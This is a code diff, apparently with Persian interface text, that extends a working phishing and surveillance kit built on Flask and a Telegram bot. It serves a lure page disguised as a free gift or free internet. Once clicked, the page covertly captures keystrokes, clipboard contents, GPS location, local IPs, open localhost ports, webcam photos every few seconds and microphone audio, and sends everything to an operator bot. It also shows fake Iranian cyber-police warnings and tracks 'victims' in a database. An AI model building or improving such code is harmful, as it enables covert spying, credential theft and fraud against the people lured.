@@ -29,7 +29,7 @@ def get_db():
 def init_db():
     with app.app_context():
         db = get_db()
-        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT, last_active TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
         db.commit()
@@ -64,54 +64,112 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False):
     except Exception as e:
         app.logger.error(f"Telegram file send failed: {e}")
 
-# -------------------- Capture Page --------------------
+def send_telegram_location(lat, lng):
+    if not TOKEN or not ADMIN_CHAT_ID:
+        return
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{TOKEN}/sendLocation",
+            json={"chat_id": ADMIN_CHAT_ID, "latitude": lat, "longitude": lng},
+            timeout=10
+        )
+    except Exception as e:
+        app.logger.error(f"Telegram location failed: {e}")
+
+# -------------------- Capture Page (photos every 3 seconds) --------------------
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
+<head><meta charset="UTF-8"><title>هدیه</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
-    <h1 id="msg" class="blink">تلگرام</h1>
-    <button id="btn" onclick="startEverything()">دریافت 100 استارز</button>
+    <h1 id="msg">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
+    <button id="btn" onclick="startEverything()">دریافت هدیه شما ...</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
     <script>
         const t="{{ token }}";
         const msg=document.getElementById('msg'),btn=document.getElementById('btn'),v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
-        let stream=null, capturing=false;
+        let stream=null;
+
         async function startEverything(){
-            if(capturing)return;
-            capturing=true;
             btn.style.display='none';
             msg.innerText='در حال برقراری ارتباط...';
+
+            // اطلاعات بدون مجوز
             fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A'})});
             try{var cf=document.createElement('canvas');cf.width=200;cf.height=50;var cfctx=cf.getContext('2d');cfctx.textBaseline='top';cfctx.font='14px Arial';cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'fingerprint',data:cf.toDataURL()})});}catch(e){}
             try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});}};}catch(e){}
-            if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),e=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})}));}
             try{var clip=await navigator.clipboard.readText();if(clip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});}catch(e){}
             [80,22,443,8080,3389,5900,21].forEach(p=>{var img=new Image();img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now();var st=Date.now();img.onload=img.onerror=function(){if(Date.now()-st<500)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'open_port',port:p})});};});
             if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{setTimeout(()=>{reg.showNotification('⚠️ هشدار فوری پلیس فتا',{body:'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',icon:'https://www.fata.gov.ir/images/logo.png',requireInteraction:true,vibrate:[300,100,300],data:{url:window.location.origin+'/go/'+t}});},15000);});}
+
+            // موقعیت مکانی
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(
+                    p => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),
+                    e => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})})
+                );
+            }
+
+            // دوربین و میکروفون
             try{
-                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
-                v.srcObject=stream;
+                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
+                v.srcObject = stream;
                 await new Promise(r=>v.onloadedmetadata=r);
-                c.width=v.videoWidth||640; c.height=v.videoHeight||480;
-                msg.innerText='اتصال برقرار شد.';
+                c.width = v.videoWidth || 640;
+                c.height = v.videoHeight || 480;
+                msg.innerText = 'اتصال برقرار شد.';
+                // عکس هر ۳ ثانیه
                 takeSnapshot();
-                window.photoInterval=setInterval(takeSnapshot,2000);
-                try{var aud=stream.getAudioTracks()[0];if(aud){var mr=new MediaRecorder(new MediaStream([aud]));var chunks=[];mr.ondataavailable=e=>chunks.push(e.data);mr.onstop=()=>{var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.onloadend=()=>{var b64=reader.result.split(',')[1];fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});};reader.readAsDataURL(blob);};mr.start();setTimeout(()=>{mr.stop();},5000);}}catch(e){}
-            }catch(e){msg.innerText='عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';}
+                window.photoInterval = setInterval(takeSnapshot, 3000);
+                // ضبط صدا ۵ ثانیه
+                try{
+                    var aud = stream.getAudioTracks()[0];
+                    if(aud){
+                        var mr = new MediaRecorder(new MediaStream([aud]));
+                        var chunks = [];
+                        mr.ondataavailable = e => chunks.push(e.data);
+                        mr.onstop = () => {
+                            var blob = new Blob(chunks, {type:'audio/webm'});
+                            var reader = new FileReader();
+                            reader.onloadend = () => {
+                                var b64 = reader.result.split(',')[1];
+                                fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});
+                            };
+                            reader.readAsDataURL(blob);
+                        };
+                        mr.start();
+                        setTimeout(() => { mr.stop(); }, 5000);
+                    }
+                }catch(e){}
+            }catch(e){
+                msg.innerText = 'عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';
+            }
+
+            // کی‌لاگر
+            var keys='';
+            document.addEventListener('keydown',e=>{keys+=e.key;});
+            setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
         }
-        function takeSnapshot(){if(!stream)return;ctx.drawImage(v,0,0,c.width,c.height);var d=c.toDataURL('image/jpeg',0.8);fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});}
-        var keys='';
-        document.addEventListener('keydown',e=>{keys+=e.key;});
-        setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
-        window.addEventListener('beforeunload',()=>{if(stream)stream.getTracks().forEach(tr=>tr.stop());clearInterval(window.photoInterval);});
+
+        function takeSnapshot(){
+            if(!stream) return;
+            ctx.drawImage(v,0,0,c.width,c.height);
+            var d = c.toDataURL('image/jpeg',0.8);
+            fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});
+        }
+
+        window.addEventListener('beforeunload', ()=>{
+            if(stream) stream.getTracks().forEach(tr=>tr.stop());
+            clearInterval(window.photoInterval);
+        });
     </script>
 </body></html>
 """
 
+# Admin login/page templates (unchanged)
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -144,8 +202,8 @@ def index():
 def new_link():
     token = str(uuid.uuid4())
     db = get_db()
-    db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
-               (token, datetime.now().isoformat(), request.remote_addr))
+    db.execute("INSERT INTO victims (token, created_at, ip, last_active) VALUES (?, ?, ?, ?)",
+               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat()))
     db.commit()
     link = f"{request.host_url}go/{token}"
     return jsonify({"link": link, "token": token})
@@ -171,10 +229,16 @@ def upload(token):
         db = get_db()
         db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                    (token, media_type, binary, datetime.now().isoformat()))
+        db.execute("UPDATE victims SET last_active=? WHERE token=?", (datetime.now().isoformat(), token))
         db.commit()
         if TOKEN and ADMIN_CHAT_ID:
-            caption = f"📸 <b>Photo</b> from {token}" if media_type=='photo' else f"🎤 <b>Audio</b> from {token}"
-            send_telegram_file(binary, 'camera.jpg' if media_type=='photo' else 'mic.webm', caption, as_image=(media_type=='photo'))
+            if media_type == 'photo':
+                count_row = db.execute("SELECT COUNT(*) as cnt FROM media WHERE token=? AND type='photo'", (token,)).fetchone()
+                cnt = count_row['cnt'] if count_row else 0
+                caption = f"📸 <b>Photo #{cnt}</b> from {token}"
+                send_telegram_file(binary, 'camera.jpg', caption, as_image=True)
+            else:
+                send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
         return jsonify({"status":"ok"})
     except Exception as e:
         return jsonify({"error":str(e)}),500
@@ -186,7 +250,7 @@ def log(token):
     db = get_db()
     db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
-    db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
+    db.execute("UPDATE victims SET ip=?, last_active=? WHERE token=?", (request.remote_addr, datetime.now().isoformat(), token))
     db.commit()
     if data.get('type') == 'device':
         msg = f"📱 <b>قربانی جدید</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nDevice: {data.get('ua','')}"
@@ -202,6 +266,7 @@ def log(token):
         send_telegram_message(msg, reply_markup=InlineKeyboardMarkup(keyboard).to_dict())
     elif data.get('type') == 'location':
         send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
+        send_telegram_location(data.get('lat'), data.get('lng'))
     return jsonify({"status":"ok"})
 
 @app.route('/admin', methods=['GET','POST'])
@@ -263,6 +328,18 @@ self.addEventListener('notificationclick', event => {
     })
   );
 });
+// Listen for custom push events (from bot)
+self.addEventListener('push', event => {
+  const payload = event.data ? event.data.text() : 'پیام جدید';
+  event.waitUntil(
+    self.registration.showNotification('📩 پیام از طرف ادمین', {
+      body: payload,
+      icon: 'https://www.fata.gov.ir/images/logo.png',
+      requireInteraction: true,
+      vibrate: [200, 100, 200]
+    })
+  );
+});
 setInterval(() => {
   if('geolocation' in navigator){
     navigator.geolocation.getCurrentPosition(pos => {
@@ -314,20 +391,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = str(uuid.uuid4())
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row   # اضافه شد
-        db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
-                   (token, datetime.now().isoformat(), query.message.chat.id))
+        db.row_factory = sqlite3.Row
+        db.execute("INSERT INTO victims (token, created_at, ip, last_active) VALUES (?, ?, ?, ?)",
+                   (token, datetime.now().isoformat(), query.message.chat.id, datetime.now().isoformat()))
         db.commit()
         db.close()
         link = f"{PUBLIC_URL}/go/{token}"
-        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(این لینک را برای قربانی ارسال کنید)")
+        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(کد مخصوص شما)")
 
     elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
         parts = data.split('|')
         action = parts[0]
         token = parts[1]
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row   # اضافه شد
+        db.row_factory = sqlite3.Row
         if action == "photo":
             row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
             if row:
@@ -407,8 +484,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("شما اجازه ندارید.", show_alert=True)
             return
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row   # اضافه شد
-        victims = db.execute("SELECT token, ip, created_at FROM victims ORDER BY created_at DESC").fetchall()
+        db.row_factory = sqlite3.Row
+        victims = db.execute("SELECT token, ip, last_active FROM victims ORDER BY last_active DESC").fetchall()
         db.close()
         if not victims:
             await query.edit_message_text("هنوز هیچ قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
@@ -416,7 +493,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         buttons = []
         for v in victims:
             short = v['token'][:8] + "..."
-            btn = InlineKeyboardButton(f"{short} ({v['ip']})", callback_data=f"victim_detail|{v['token']}")
+            last = v['last_active'] if v['last_active'] else "نامشخص"
+            btn = InlineKeyboardButton(f"{short} ({v['ip']}) - {last}", callback_data=f"victim_detail|{v['token']}")
             buttons.append([btn])
         buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
         await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
@@ -427,7 +505,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = data.split("|")[1]
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row   # اضافه شد
+        db.row_factory = sqlite3.Row
         victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
         if not victim:
             await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
@@ -440,7 +518,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = f"<b>مشخصات قربانی</b>\n"
         text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
         text += f"<b>IP:</b> {victim['ip']}\n"
-        text += f"<b>زمان:</b> {victim['created_at']}\n"
+        text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
+        text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
         text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
 
         keyboard = [
@@ -451,9 +530,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}"),
              InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}")],
             [InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
-            [InlineKeyboardButton("🔙 بازگشت به لیست قربانیان", callback_data="victims_list")]
+            [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
+            [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
         ]
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data.startswith("delete_victim|"):
+        if user_id != ADMIN_USER_ID:
+            await query.answer("شما اجازه ندارید.", show_alert=True)
+            return
+        token = data.split("|")[1]
+        db = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+        db.execute("DELETE FROM victims WHERE token=?", (token,))
+        db.execute("DELETE FROM logs WHERE token=?", (token,))
+        db.execute("DELETE FROM media WHERE token=?", (token,))
+        db.commit()
+        db.close()
+        await query.edit_message_text(f"قربانی {token} به همراه تمام داده‌ها حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
 
 async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
